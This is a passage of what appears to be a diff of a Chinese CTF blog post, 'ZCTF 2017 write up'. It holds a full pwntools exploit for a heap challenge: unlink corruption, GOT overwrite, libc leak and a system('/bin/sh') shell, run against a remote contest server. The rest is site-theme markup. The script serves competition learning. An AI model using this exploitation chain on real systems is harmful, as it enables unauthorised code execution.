class="title">New</span><span class="params">(p, size, title, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the title:\n'</span>)</div><div class="line">    p.send(title)</div><div class="line">    p.recvuntil(<span class="string">'Input the size of content:\n'</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the content:\n'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(p, idx, offset, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the start offset:'</span>)</div><div class="line">    p.send(str(offset) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the new content:'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeTitle</span><span class="params">(p, idx, title)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">    p.send(<span class="string">'5\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the new title:'</span>)</div><div class="line">    p.send(title)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./note')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">4003</span>)</div><div class="line"></div><div class="line">ptr = <span class="number">0x6020c0</span> + <span class="number">0x08</span> * <span class="number">8</span></div><div class="line">fake_fd = ptr - <span class="number">0x18</span></div><div class="line">fake_bk = fake_fd + <span class="number">0x08</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x121</span>)</div><div class="line">payload += p64(fake_fd)</div><div class="line">payload += p64(fake_bk)[:<span class="number">3</span>]</div><div class="line"></div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, payload + <span class="string">'\n'</span>, <span class="string">'B'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'C'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'D'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'E'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'F'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span></div><div class="line">payload += p64(<span class="number">0x120</span>)</div><div class="line">payload += p64(<span class="number">0xa0</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">8</span>, <span class="number">127</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">9</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x6020c0</span>)</div><div class="line">payload += p64(<span class="number">0x601fd8</span>)</div><div class="line">payload += p64(<span class="number">0x602048</span>)</div><div class="line">payload += p64(<span class="number">0x602008</span>)[:<span class="number">3</span>]</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">8</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">7</span>, p64(<span class="number">0x4007e6</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">5</span>, <span class="number">1</span>, <span class="string">'A'</span> * <span class="number">0x1f</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x1f</span>)</div><div class="line">data = p.recvuntil(<span class="string">'Delete success'</span>, drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</div><div class="line">heap_addr = u64(data)</div><div class="line">log.info(<span class="string">'heap addr(): '</span> + hex(heap_addr))</div><div class="line"></div><div class="line">leak_addr = heap_addr + <span class="number">0x770</span></div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x70</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x2b0</span>) + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x00</span> )+ <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x50</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(leak_addr + <span class="number">0x990</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x40</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x000000000040117b</span>)+ p64(<span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x20</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00000000e8150c70</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x20</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line">p.recvuntil(<span class="string">'\x0a'</span>)</div><div class="line">data = p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</div><div class="line">main_arena = u64(data)</div><div class="line"></div><div class="line">log.info(<span class="string">"main_arena : "</span> + hex(main_arena))</div><div class="line"></div><div class="line"><span class="comment">#libc = ELF('./local.libc64')</span></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"></div><div class="line"><span class="comment">#libc_base = main_arena - 0x398b58</span></div><div class="line">libc_base = main_arena - <span class="number">0x3BE7B8</span></div><div class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">log.info(<span class="string">"system() addr: "</span> + hex(system_addr))</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(<span class="number">0x602058</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">0</span>, p64(system_addr) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+        </div>
 
-<!-- Tags -->
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2017-05-04T15:34:54.000Z" itemprop="dateUpdated">2017-05-04 23:34:54</time>
+</span><br>
 
 
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2017/02/27/ZCTF-2017-write-up/" target="_blank" rel="external">http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/</a>
+        
+    </div>
+    <footer>
+        <a href="http://blog.dazzlepppp.cn">
+            <img src="/img/avatar.jpg" alt="DazzleP">
+            DazzleP
+        </a>
+    </footer>
+</blockquote>
 
-<div class="tags">
-    <a href="/tags/ctf/" class="button small">ctf</a> <a href="/tags/pwn/" class="button small">pwn</a> <a href="/tags/writeup/" class="button small">writeup</a>
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
 </div>
 
 
-<!-- Comments -->
-<div>
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
     
-    <hr />
-    <h3>comment:</h3>
-    <div id="disqus_thread">
-        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/&title=《ZCTF 2017 write up》 — DazzleP's Blog&pic=http://blog.dazzlepppp.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/&title=《ZCTF 2017 write up》 — DazzleP's Blog&source=A poor bin dog from ROIS@FZU" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ZCTF 2017 write up》 — DazzleP's Blog&url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/&via=http://blog.dazzlepppp.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
     </div>
 
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2017/03/24/0ctf-2017-writeup/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">0ctf 2017 writeup</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2017/02/04/FSOP以及glibc针对其所做的防御措施/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">FSOP以及glibc针对其所做的防御措施</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <ul class="reward-items">
+        
+        <li>
+            <img src="/img/wechat.jpg" title="微信打赏二维码" alt="微信打赏二维码">
+            <p>微信</p>
+        </li>
+        
+
+        
+        <li>
+            <img src="/img/alipay.jpg" title="支付宝打赏二维码" alt="支付宝打赏二维码">
+            <p>支付宝</p>
+        </li>
+        
+    </ul>
+</div>
+
 
 
 </div>
 
-</section>
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
 
 
-      <!-- Three - the contact form is on every page! -->
-        <section id="three">
-          <h2>Get In Touch</h2>
-<p>Us a service like Google forms or formspree to modify this partial in _partials/contact-form.</p>
-<div class="row">
-  <div class="8u 12u$(small)">
-    <form method="post" action="#">
-      <div class="row uniform 50%">
-        <div class="6u 12u$(xsmall)"><input type="text" name="name" id="name" placeholder="Name" /></div>
-        <div class="6u$ 12u$(xsmall)"><input type="email" name="email" id="email" placeholder="Email" /></div>
-        <div class="12u$"><textarea name="message" id="message" placeholder="Message" rows="4"></textarea></div>
-      </div>
-    </form>
-    <ul class="actions">
-      <li><input type="submit" value="Send Message" /></li>
-    </ul>
-  </div>
-  <div class="4u$ 12u$(small)">
-    <ul class="labeled-icons">
-      <li>
-        <h3 class="icon fa-home"><span class="label">Address</span></h3>
-        1234 Somewhere Rd.<br />
-        Nashville, TN 00000<br />
-        United States
-      </li>
-      <li>
-        <h3 class="icon fa-mobile"><span class="label">Phone</span></h3>
-        000-000-0000
-      </li>
-      <li>
-        <h3 class="icon fa-envelope-o"><span class="label">Email</span></h3>
-        <a href="#">hello@untitled.tld</a>
-      </li>
-    </ul>
-  </div>
-</div>
-        </section>
-
-        <!-- Footer -->
-<footer id="footer">
-    <div class="inner">
-
-        <ul class="icons">
+        <p>
             
-                <li><a href="https://twitter.com/?lang=en" class="icon fa-twitter" target="_blank" ><span class="label">Twitter</span></a></li>
-            
-            
-                <li><a href="https://www.facebook.com/" class="icon fa-facebook" target="_blank" ><span class="label">Facebook</span></a></li>
-            
-            
-                <li><a href="https://www.instagram.com/" class="icon fa-instagram" target="_blank" ><span class="label">Instagram</span></a></li>
-            
-            
-                <li><a href="https://dribbble.com/" class="icon fa-dribbble" target="_blank" ><span class="label">Dribbble</span></a></li>
-            
-            
-                <li><a href="https://github.com/klugjo/hexo-theme-phantom/commits?author=klugjo" class="icon fa-github" target="_blank" ><span class="label">GitHub</span></a></li>
-            
-            
-                <li><a href="https://plus.google.com/" class="icon fa-google-plus" target="_blank" ><span class="label">Google+</span></a></li>
-            
-            
-                <li><a href="https://www.behance.net/" class="icon fa-behance" target="_blank" ><span class="label">Behance</span></a></li>
-            
-            
-                <li><a href="https://500px.com/" class="icon fa-500px" target="_blank" ><span class="label">500px</span></a></li>
-            
-            
-                <li><a href="\#" class="icon fa-envelope-o" target="_blank" ><span class="label">Email</span></a></li>
-            
-            
-                <li><a href="\#" class="icon  fa-rss" target="_blank" ><span class="label">RSS</span></a></li>
-            
-        </ul>
-
-        <ul class="copyright">
-            <li>&copy; Untitled. All rights reserved</li>
-            <li>Design: <a href="http://html5up.net" target="_blank">HTML5 UP</a></li>
-            <li>Hexo: <a href="http://livingos.com/" target="_blank">Tim Hyde</a></li>
-        </ul>
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p>
+            <span>Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a></span>
+            <span>DazzleP &copy; 2015 - 2017</span>
+        </p>
     </div>
 </footer>
 
-        
-    </div>
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
 
-    <!-- After footer scripts -->
-      <!-- Scripts -->
-  <script src="/js/jquery.min.js"></script>  <script src="/js/jquery.poptrox.min.js"></script>  <script src="/js/skel.min.js"></script>  <script src="/js/util.js"></script>
-  <!--[if lte IE 8]>
-  <script src="/js/ie/respond.min.js"></script>
-  <![endif]-->
 
-  <script src="/js/main.js"></script>
-  <!-- Disqus Comments -->
-  
-  <script type="text/javascript">
-      var disqus_shortname = 'livingos';
 
-      (function(){
-          var dsq = document.createElement('script');
-          dsq.type = 'text/javascript';
-          dsq.async = true;
-          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-      }());
-  </script>
-  
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/&title=《ZCTF 2017 write up》 — DazzleP's Blog&pic=http://blog.dazzlepppp.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/&title=《ZCTF 2017 write up》 — DazzleP's Blog&source=A poor bin dog from ROIS@FZU" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ZCTF 2017 write up》 — DazzleP's Blog&url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/&via=http://blog.dazzlepppp.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
 
 
 </body>
